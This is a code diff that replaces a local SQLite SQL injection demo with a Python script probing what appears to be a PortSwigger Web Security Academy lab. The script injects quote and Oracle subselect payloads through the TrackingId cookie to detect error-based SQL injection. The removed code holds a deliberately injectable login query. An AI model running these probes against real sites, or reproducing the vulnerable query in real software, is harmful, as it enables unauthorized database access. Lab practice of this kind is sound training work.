@@ -1,39 +1,56 @@
-import sqlite3
+import requests
+import difflib
+import string
+from tqdm import tqdm
+import concurrent.futures
 
-# Connect to the SQLite database (or any other database you have access to)
-conn = sqlite3.connect(':memory:')  # Using in-memory database for simplicity
+# Define the base URL
+url = 'https://0a7c00e8047db3b3808e122c0094003f.web-security-academy.net'
 
-# Create a table with a vulnerable query construction (for demonstration purposes only)
-conn.execute('''CREATE TABLE users (
-                id INTEGER PRIMARY KEY,
-                username TEXT,
-                password TEXT
-                )''')
+def web_request(s, query):
+    cookies['TrackingId'] = tracking_id + query
+    response = s.get(url=url, cookies=cookies)
+    return response
 
-# Insert some sample data
-conn.execute("INSERT INTO users (username, password) VALUES ('admin', 'admin123')")
-conn.execute("INSERT INTO users (username, password) VALUES ('user', 'password123')")
+# Start a session
+with requests.Session() as s:
+    # Initial request to get cookies
+    r = s.get(url)
+    
+    # Extract the cookies
+    tracking_id = ''
+    session_id = ''
+    for cookie in r.cookies:
+        if cookie.name == 'TrackingId':
+            tracking_id = cookie.value
+        elif cookie.name == 'session':
+            session_id = cookie.value
 
-# Vulnerable function that constructs a query without proper input validation
-def login(username):
-    cursor = conn.cursor()
-    query = f"SELECT * FROM users WHERE username = '{username}'"  # Vulnerable query
-    cursor.execute(query)
-    query = f""
-    return cursor.fetchall()
+    # Debug: Print the initial cookies
+    print(f'Initial TrackingId: {tracking_id}')
+    print(f'Initial session: {session_id}')
 
-# Attempt to exploit the vulnerability using SQL injection
-def exploit():
-    payloads = [
-        "' order by 1--",
-        "' order by 2--",
-        "' union select null,null,null--"
-    ]
+    cookies = {
+        'TrackingId': tracking_id,
+        'session': session_id
+    }
+    # Error query
+    query = "'"
+    response = web_request(s,query)
+    print(f"{query=} : {response.status_code}")
 
-    for payload in payloads:
-        print(f"Trying payload: {payload}")
-        result = login(payload)
-        print("Result:", result)
+    # No error
+    query = "''"
+    response = web_request(s,query)
+    print(f"{query=} : {response.status_code}")
 
-if __name__ == "__main__":
-    exploit()
+    # Server interpreting SQL check
+    query = "'||(SELECT '')||'"
+    response = web_request(s,query)
+    print(f"{query=} : {response.status_code}")
+
+    query = "'||(SELECT '' FROM dual)||'"
+    response = web_request(s,query)
+    print(f"{query=} : {response.status_code}")
+    
+    # 
